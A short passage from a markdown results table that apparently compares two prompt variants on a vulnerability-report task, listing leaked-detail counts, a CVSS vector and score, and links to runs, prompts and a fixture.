| smaller-v4-structure | 1672 | 5/8 (internal host, borrower phone, DB user, IP 10.42.0.19, IP 10.42.0.23) | — | 0 | 6/6 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` | 6.5 / 6.5 | matches reference | 0 words |
| smaller-v5-steps | 1668 | 3/8 (DB user, IP 10.42.0.19, IP 10.42.0.23) | 0/8 | 0 | 6/6 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` | 6.5 / 6.5 | matches reference | 0 words |

Raw outputs: [`docs/fl-02/runs/`](./fl-02/runs/) · prompts: [`docs/fl-02/prompts/`](./fl-02/prompts/) ·
fixture: [`docs/fl-02/fixture/`](./fl-02/fixture/).
